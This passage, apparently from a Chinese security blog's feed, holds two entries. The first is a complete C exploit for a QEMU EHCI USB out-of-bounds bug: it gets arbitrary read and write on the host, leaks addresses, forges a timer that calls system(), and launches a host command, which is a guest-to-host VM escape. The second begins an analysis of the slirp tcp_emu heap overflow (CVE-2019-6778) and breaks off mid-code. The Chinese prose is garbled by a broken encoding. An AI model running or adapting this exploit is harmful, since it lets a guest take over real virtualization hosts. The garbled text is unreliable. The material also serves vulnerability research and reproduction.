class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SHIFT  12</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span><br><br><span class="hljs-type">void</span> *mmio;<br><span class="hljs-type">int</span> fd;<br><span class="hljs-type">void</span> *buf;<br><span class="hljs-type">uint8_t</span> *setup_buf;<br><span class="hljs-type">size_t</span> *payload_buf;<br><span class="hljs-type">void</span> *data_buf;<br><span class="hljs-type">void</span> *data_buf_oob;<br><span class="hljs-type">uint32_t</span> *entry;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EHCIqh</span> * <span class="hljs-title">qh</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EHCIqtd</span> * <span class="hljs-title">qtd</span>;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PORTSC_PRESET       (1 &lt;&lt; 8)     <span class="hljs-comment">// Port Reset</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PORTSC_PED          (1 &lt;&lt; 2)     <span class="hljs-comment">// Port Enable/Disable</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USBCMD_RUNSTOP      (1 &lt;&lt; 0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USBCMD_PSE          (1 &lt;&lt; 4)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_DIR_OUT         0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_DIR_IN          0x80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> QTD_TOKEN_ACTIVE    (1 &lt;&lt; 7)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_TOKEN_SETUP     2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_TOKEN_IN        1 <span class="hljs-comment">/* device -&gt; host */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_TOKEN_OUT       0 <span class="hljs-comment">/* host -&gt; device */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SETUP_STATE_DATA    2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> QTD_TOKEN_TBYTES_SH 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> QTD_TOKEN_PID_SH    8</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EHCIqh</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> next;                    <span class="hljs-comment">/* Standard next link pointer */</span><br><br>    <span class="hljs-comment">/* endpoint characteristics */</span><br>    <span class="hljs-type">uint32_t</span> epchar;<br><br>    <span class="hljs-comment">/* endpoint capabilities */</span><br>    <span class="hljs-type">uint32_t</span> epcap;<br><br>    <span class="hljs-type">uint32_t</span> current_qtd;             <span class="hljs-comment">/* Standard next link pointer */</span><br>    <span class="hljs-type">uint32_t</span> next_qtd;                <span class="hljs-comment">/* Standard next link pointer */</span><br>    <span class="hljs-type">uint32_t</span> altnext_qtd;<br><br>    <span class="hljs-type">uint32_t</span> token;                   <span class="hljs-comment">/* Same as QTD token */</span><br>    <span class="hljs-type">uint32_t</span> bufptr[<span class="hljs-number">5</span>];               <span class="hljs-comment">/* Standard buffer pointer */</span><br><br>&#125; EHCIqh;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EHCIqtd</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> next;                    <span class="hljs-comment">/* Standard next link pointer */</span><br>    <span class="hljs-type">uint32_t</span> altnext;                 <span class="hljs-comment">/* Standard next link pointer */</span><br>    <span class="hljs-type">uint32_t</span> token;<br><br>    <span class="hljs-type">uint32_t</span> bufptr[<span class="hljs-number">5</span>];               <span class="hljs-comment">/* Standard buffer pointer */</span><br><br>&#125; EHCIqtd;<br><br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">page_offset</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr)</span><br>&#123;<br>    <span class="hljs-comment">// addr &amp; 0xfff</span><br>    <span class="hljs-keyword">return</span> addr &amp; ((<span class="hljs-number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gfn</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> pme, gfn;<br>    <span class="hljs-type">size_t</span> offset;<br>    fd = open(<span class="hljs-string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;open&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    offset = ((<span class="hljs-type">uintptr_t</span>)addr &gt;&gt; <span class="hljs-number">9</span>) &amp; ~<span class="hljs-number">7</span>;<br>    lseek(fd, offset, SEEK_SET);<br>    read(fd, &amp;pme, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span> (!(pme &amp; PFN_PRESENT))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>    gfn = pme &amp; PFN_PFN;<br>    close(fd);<br>    <span class="hljs-keyword">return</span> gfn;<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gpa</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> gfn = gva_to_gfn(addr);<br>    assert(gfn != <span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="hljs-type">uint64_t</span>)addr);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint32_t</span> value)</span>&#123;<br>    *(<span class="hljs-type">uint32_t</span> *)(mmio + addr) = value;<br>&#125;<br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">mmio_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr)</span>&#123;<br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">uint32_t</span> *)(mmio + addr);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_length</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> len, <span class="hljs-type">uint8_t</span> option)</span>&#123;<br>    mmio_write(<span class="hljs-number">0x64</span>, PORTSC_PRESET);<br>    mmio_write(<span class="hljs-number">0x64</span>, PORTSC_PED);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    qh-&gt;token = QTD_TOKEN_ACTIVE;<br>    qh-&gt;current_qtd = gva_to_gpa(qtd);<br>    qtd-&gt;token = QTD_TOKEN_ACTIVE | USB_TOKEN_SETUP &lt;&lt; QTD_TOKEN_PID_SH | <span class="hljs-number">8</span> &lt;&lt; QTD_TOKEN_TBYTES_SH;<br>    qtd-&gt;bufptr[<span class="hljs-number">0</span>] = gva_to_gpa(setup_buf);<br><br>    setup_buf[<span class="hljs-number">0</span>] = option;<br>    <span class="hljs-comment">// setup_buf[2] = value &amp; 0xff;</span><br>    <span class="hljs-comment">// setup_buf[3] = (value &gt;&gt; 8 ) &amp; 0xff;</span><br>    <span class="hljs-comment">// setup_buf[4] = index &amp; 0xff;</span><br>    <span class="hljs-comment">// setup_buf[5] = (index &gt;&gt; 8 ) &amp; 0xff;</span><br>    setup_buf[<span class="hljs-number">6</span>] = len &amp; <span class="hljs-number">0xff</span>;<br>    setup_buf[<span class="hljs-number">7</span>] = (len &gt;&gt; <span class="hljs-number">8</span> ) &amp; <span class="hljs-number">0xff</span>;<br><br>    mmio_write(<span class="hljs-number">0x2c</span>, <span class="hljs-number">0</span>);<br>    mmio_write(<span class="hljs-number">0x34</span>, gva_to_gpa(buf));<br>    mmio_write(<span class="hljs-number">0x20</span>, USBCMD_RUNSTOP | USBCMD_PSE);<br>    sleep(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">read_from_usb</span><span class="hljs-params">()</span>&#123;<br>    mmio_write(<span class="hljs-number">0x64</span>, PORTSC_PRESET);<br>    mmio_write(<span class="hljs-number">0x64</span>, PORTSC_PED);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    qh-&gt;token = QTD_TOKEN_ACTIVE;<br>    qh-&gt;current_qtd = gva_to_gpa(qtd);<br>    qtd-&gt;token = QTD_TOKEN_ACTIVE | USB_TOKEN_IN &lt;&lt; QTD_TOKEN_PID_SH | <span class="hljs-number">0x2000</span> &lt;&lt; QTD_TOKEN_TBYTES_SH;<br>    qtd-&gt;bufptr[<span class="hljs-number">0</span>] = gva_to_gpa(data_buf);<br>    qtd-&gt;bufptr[<span class="hljs-number">1</span>] = gva_to_gpa(data_buf_oob);<br><br>    mmio_write(<span class="hljs-number">0x2c</span>, <span class="hljs-number">0</span>);<br>    mmio_write(<span class="hljs-number">0x34</span>, gva_to_gpa(buf));<br>    mmio_write(<span class="hljs-number">0x20</span>, USBCMD_RUNSTOP | USBCMD_PSE);<br>    sleep(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">write_to_usb</span><span class="hljs-params">()</span>&#123;<br>    mmio_write(<span class="hljs-number">0x64</span>, PORTSC_PRESET);<br>    mmio_write(<span class="hljs-number">0x64</span>, PORTSC_PED);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    qh-&gt;token = QTD_TOKEN_ACTIVE;<br>    qh-&gt;current_qtd = gva_to_gpa(qtd);<br>    qtd-&gt;token = QTD_TOKEN_ACTIVE | USB_TOKEN_OUT &lt;&lt; QTD_TOKEN_PID_SH | <span class="hljs-number">0x2000</span> &lt;&lt; QTD_TOKEN_TBYTES_SH;<br>    qtd-&gt;bufptr[<span class="hljs-number">0</span>] = gva_to_gpa(data_buf);<br>    qtd-&gt;bufptr[<span class="hljs-number">1</span>] = gva_to_gpa(data_buf_oob);<br><br>    mmio_write(<span class="hljs-number">0x2c</span>, <span class="hljs-number">0</span>);<br>    mmio_write(<span class="hljs-number">0x34</span>, gva_to_gpa(buf));<br>    mmio_write(<span class="hljs-number">0x20</span>, USBCMD_RUNSTOP | USBCMD_PSE);<br>    sleep(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arb_read</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> offset, <span class="hljs-type">uint32_t</span> size)</span>&#123;<br>    set_length(<span class="hljs-number">0x100</span>, USB_DIR_IN);<br>    <span class="hljs-built_in">memset</span>(data_buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    <span class="hljs-built_in">memset</span>(data_buf_oob, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    set_length(<span class="hljs-number">0x1010</span>, USB_DIR_OUT);<br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">4</span>) = SETUP_STATE_DATA;  <span class="hljs-comment">//s-&gt;setup_state</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">8</span>) = <span class="hljs-number">0x1018</span>;            <span class="hljs-comment">//s-&gt;setup_len</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0xc</span>) = ((<span class="hljs-type">size_t</span>)<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">32</span>)  - <span class="hljs-number">8</span>  - <span class="hljs-number">0x1010</span>; <span class="hljs-comment">//s-&gt;setup_index</span><br>    write_to_usb();<br><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf) = USB_DIR_IN;<br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0xc</span>) = SETUP_STATE_DATA; <span class="hljs-comment">//s-&gt;setup_state</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0x10</span>) = offset + size; <span class="hljs-comment">//s-&gt;setup_len</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0x14</span>) = offset - <span class="hljs-number">0x1020</span>; <span class="hljs-comment">//s-&gt;setup_index</span><br>    write_to_usb();<br>    read_from_usb();<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arb_write</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> offset, <span class="hljs-type">void</span> *payload, <span class="hljs-type">uint32_t</span> payload_size)</span>&#123;<br>    set_length(<span class="hljs-number">0x100</span>, USB_DIR_IN);<br>    <span class="hljs-built_in">memset</span>(data_buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    <span class="hljs-built_in">memset</span>(data_buf_oob, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    set_length(<span class="hljs-number">0x1010</span>, USB_DIR_OUT);<br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">4</span>) = SETUP_STATE_DATA;  <span class="hljs-comment">//s-&gt;setup_state</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">8</span>) = <span class="hljs-number">0x1018</span>;            <span class="hljs-comment">//s-&gt;setup_len</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0xc</span>) = ((<span class="hljs-type">size_t</span>)<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">32</span>)  - <span class="hljs-number">8</span>  - <span class="hljs-number">0x1010</span>; <span class="hljs-comment">//s-&gt;setup_index</span><br>    write_to_usb();<br><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf) = USB_DIR_OUT;<br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0xc</span>) = SETUP_STATE_DATA; <span class="hljs-comment">//s-&gt;setup_state</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0x10</span>) = offset + payload_size; <span class="hljs-comment">//s-&gt;setup_len</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0x14</span>) = offset - <span class="hljs-number">0x1020</span>; <span class="hljs-comment">//s-&gt;setup_index</span><br>    write_to_usb();<br>    <span class="hljs-built_in">memcpy</span>(data_buf, payload, payload_size);<br>    <span class="hljs-comment">//getchar();</span><br>    write_to_usb();<br>&#125;<br><br><span class="hljs-type">char</span> cmd[<span class="hljs-number">0x40</span>] = <span class="hljs-string">&quot;gnome-calculator&quot;</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span>  mmio_fd = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;</span>, O_RDWR | O_SYNC);<br>    mmio         = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="hljs-number">0</span>);<br>    buf = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x3000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    mlock(buf, <span class="hljs-number">0x3000</span>);<br><br>    entry = buf + <span class="hljs-number">4</span>;<br>    qh = buf + <span class="hljs-number">0x100</span>;<br>    qtd = buf + <span class="hljs-number">0x200</span>;<br>    setup_buf = buf + <span class="hljs-number">0x300</span>;<br>    payload_buf = buf + <span class="hljs-number">0x400</span>;<br>    data_buf = buf + <span class="hljs-number">0x1000</span>;<br>    data_buf_oob = buf + <span class="hljs-number">0x2000</span>;<br><br>    *entry = gva_to_gpa(qh) + <span class="hljs-number">2</span>;<br><br>    <span class="hljs-comment">// set_length(0x100, USB_DIR_IN);</span><br>    arb_read(<span class="hljs-number">0x2004</span>, <span class="hljs-number">0x40</span>);<br>    <span class="hljs-type">size_t</span> elf_addr = *(<span class="hljs-type">uint64_t</span>*)(data_buf + <span class="hljs-number">0x18</span>);<br>    <span class="hljs-type">size_t</span> elf_base_addr = elf_addr - <span class="hljs-number">0x538467</span>;<br>    <span class="hljs-type">size_t</span> system_plt = elf_base_addr + <span class="hljs-number">0x2c4940</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak_elf_base_addr_is %#lx\n&quot;</span>, elf_base_addr);<br><br>    <span class="hljs-type">size_t</span> heap_addr = *(<span class="hljs-type">uint64_t</span>*)(data_buf);<br>    <span class="hljs-type">size_t</span> usb_device_addr = heap_addr - <span class="hljs-number">0x2050</span>;<br>    <span class="hljs-type">size_t</span> ehci_state_addr = usb_device_addr - <span class="hljs-number">0x83260</span>;<br>    <span class="hljs-type">size_t</span> usb_data_buf = usb_device_addr + <span class="hljs-number">0xdc</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak_usb_device_addr_is %#lx\n&quot;</span>, usb_device_addr);<br><br>    <span class="hljs-type">size_t</span> time_list = usb_device_addr - <span class="hljs-number">0xba9b50</span>;<br><br>    <span class="hljs-type">size_t</span> fake_timer[<span class="hljs-number">8</span>];<br>    <span class="hljs-type">size_t</span> fake_timer_addr = usb_data_buf + <span class="hljs-number">4</span>;<br>    <span class="hljs-type">size_t</span> cmd_addr = fake_timer_addr + <span class="hljs-number">0x40</span>;<br>    <span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;<br>    fake_timer[i++] = <span class="hljs-number">0xffffffffffffffff</span>;<br>    fake_timer[i++] = time_list;<br>    fake_timer[i++] = system_plt;<br>    fake_timer[i++] = cmd_addr;<br>    fake_timer[i++] = <span class="hljs-number">0</span>;<br>    fake_timer[i++] = <span class="hljs-number">0</span>;<br>    fake_timer[i++] = <span class="hljs-number">0</span>;<br>    fake_timer[i++] = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">memcpy</span>(payload_buf, fake_timer, <span class="hljs-number">0x40</span>);<br>    <span class="hljs-built_in">memcpy</span>(payload_buf + <span class="hljs-number">8</span>, cmd, <span class="hljs-number">0x40</span>);<br>    *(payload_buf + <span class="hljs-number">0x10</span>) = fake_timer_addr;<br><br>    <span class="hljs-type">uint32_t</span> offset = (<span class="hljs-type">uint32_t</span>)(time_list + <span class="hljs-number">0x40</span> - usb_data_buf);    <br>    set_length(<span class="hljs-number">0x100</span>, USB_DIR_IN);<br>    <span class="hljs-built_in">memset</span>(data_buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    <span class="hljs-built_in">memset</span>(data_buf_oob, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    set_length(<span class="hljs-number">0x1010</span>, USB_DIR_OUT);<br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">4</span>) = SETUP_STATE_DATA;  <span class="hljs-comment">//s-&gt;setup_state</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">8</span>) = <span class="hljs-number">0x1018</span>;            <span class="hljs-comment">//s-&gt;setup_len</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0xc</span>) = ((<span class="hljs-type">size_t</span>)<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">32</span>)  - <span class="hljs-number">8</span>  - <span class="hljs-number">0x1010</span>; <span class="hljs-comment">//s-&gt;setup_index</span><br>    write_to_usb();<br><br>    <span class="hljs-built_in">memcpy</span>(data_buf + <span class="hljs-number">0xc</span>, payload_buf, <span class="hljs-number">0x80</span>);<br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf) = USB_DIR_OUT;<br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0xc</span>) = SETUP_STATE_DATA; <span class="hljs-comment">//s-&gt;setup_state</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0x10</span>) = offset + <span class="hljs-number">8</span>; <span class="hljs-comment">//s-&gt;setup_len</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0x14</span>) = offset - <span class="hljs-number">0x1020</span>; <span class="hljs-comment">//s-&gt;setup_index</span><br>    write_to_usb();<br>    <span class="hljs-built_in">memcpy</span>(data_buf, payload_buf + <span class="hljs-number">0x10</span>, <span class="hljs-number">8</span>);<br>    write_to_usb();<br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œæ•ˆæœå¦‚ä¸‹ï¼š</p><img src="/img/21/Screenshot 2023-10-11 011141.png" style="zoom: 67%;" />]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2019-6778</title>
    <link href="/2023/10/07/CVE-2019-6778/"/>
    <url>/2023/10/07/CVE-2019-6778/</url>
    
    <content type="html"><![CDATA[<p>æœ€è¿‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆåˆé‡æ–°å¼€å§‹å¯¹qemuçš„æ¼æ´äº§ç”Ÿäº†å…´è¶£ï¼Œå¯èƒ½æ˜¯V8å®åœ¨å­¦ä¸æ˜ç™½ï¼ˆæ„Ÿè§‰å¤ªç„å­¦äº†ï¼ŒğŸ˜µâ€ğŸ’«ï¼‰</p><p>çœŸæ­£å¤ç°å»ºè®®ç›´æ¥çœ‹å¤§ä½¬çš„æ–‡ç« ï¼š<a href="https://www.anquanke.com/post/id/197639">https://www.anquanke.com/post/id/197639</a>   ã€     <a href="https://github.com/0xKira/qemu-vm-escape/blob/master/writeup_zh.md">https://github.com/0xKira/qemu-vm-escape/blob/master/writeup_zh.md</a></p><p>è¯¥æ¼æ´å­˜åœ¨äºqemu3.1.0ä¸­ï¼Œå†…æ ¸ä¸æ–‡ä»¶ç³»ç»Ÿçš„ç¯å¢ƒç›´æ¥æ‹¿V1NKeå¸ˆå‚…å‡ºçš„é¢˜ç›®å³å¯ï¼š<a href="https://github.com/V1NKe/learning-qemu/tree/master/ctf/original/2020-geekpwn-V1NKe&#39;sQEMU-final">https://github.com/V1NKe/learning-qemu/tree/master/ctf/original/2020-geekpwn-V1NKe&#39;sQEMU-final</a></p><p>æ„å»ºé•œåƒæ—¶ï¼Œç”±äºDebiançš„stretchè¿™ä¸ªç‰ˆæœ¬å·²ç»ä¸èƒ½åœ¨debootstrapä¸­ç»§ç»­ä½¿ç”¨äº†ï¼Œæ”¹ç”¨ä¸ºbusterå³å¯ã€‚</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>å…·ä½“æ¼æ´å­˜åœ¨äºslirp&#x2F;tcp_subr.cä¸­çš„<a href="https://elixir.bootlin.com/qemu/v3.1.0/source/slirp/tcp_subr.c#L611">tcp_emu</a>ï¼Œåœ¨ä½¿ç”¨113ç«¯å£(Identification protocol)æ—¶è¿›å…¥è¯¥å‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> EMU_IDENT:<br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Identification protocol as per rfc-1413</span><br><span class="hljs-comment"> */</span><br><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">socket</span> *<span class="hljs-title">tmpso</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">addr</span>;</span><br><span class="hljs-type">socklen_t</span> addrlen = <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> sockaddr_in);<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sbuf</span> *<span class="hljs-title">so_rcv</span> =</span> &amp;so-&gt;so_rcv;<br><br><span class="hljs-built_in">memcpy</span>(so_rcv-&gt;sb_wptr, m-&gt;m_data, m-&gt;m_len);<br>so_rcv-&gt;sb_wptr += m-&gt;m_len;<br>so_rcv-&gt;sb_rptr += m-&gt;m_len;<br>m-&gt;m_data[m-&gt;m_len] = <span class="hljs-number">0</span>; <span class="hljs-comment">/* NULL terminate */</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">strchr</span>(m-&gt;m_data, <span class="hljs-string">&#x27;\r&#x27;</span>) || <span class="hljs-built_in">strchr</span>(m-&gt;m_data, <span class="hljs-string">&#x27;\n&#x27;</span>)) &#123;<br>...<br>&#125;<br>m_free(m);<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è€Œè¯¥å‡½æ•°ä¸­çš„<code>memcpy(so_rcv-&gt;sb_wptr, m-&gt;m_data, m-&gt;m_len)</code>è¯­å¥æ²¡æœ‰å¯¹ç¼“å†²åŒºå¤§å°è¿›è¡Œä»»ä½•æ£€æŸ¥ï¼Œå¤šæ¬¡è°ƒç”¨å¯ä»¥æ— é™æ‹·è´æ•°æ®é€ æˆå †æº¢å‡ºã€‚</p><p>å…³äºæº¢å‡ºçš„ä½ç½®ï¼Œè¿™é‡Œä¸å¤ªèƒ½ç†è§£ama2in9å¸ˆå‚…çš„è¿™ä¸ª<a href="https://ama2in9.top/2021/01/02/cve-2019-6788/">è¿½åŠ æ‹·è´</a>ï¼š</p>  <img src="/img/20/Screenshot 2023-10-09 095605.png" style="zoom:50%;" /><p>æŸ¥çœ‹ä¸Šå±‚çš„tcp_inputå‡½æ•°ï¼Œåœ¨tcp_emuå‡½æ•°ä¸­çš„è¿”å›å€¼æ˜¯0ï¼Œå°±ä¸ä¼šè¿›å…¥sbappendå‡½æ•°ï¼Œæº¢å‡ºçš„ä½ç½®å°±æ˜¯tcp_emuå‡½æ•°ä¸­çš„memcpyå¯¼è‡´çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ti-&gt;ti_ack == tp-&gt;snd_una &amp;&amp;<br>    tcpfrag_list_empty(tp) &amp;&amp;<br>    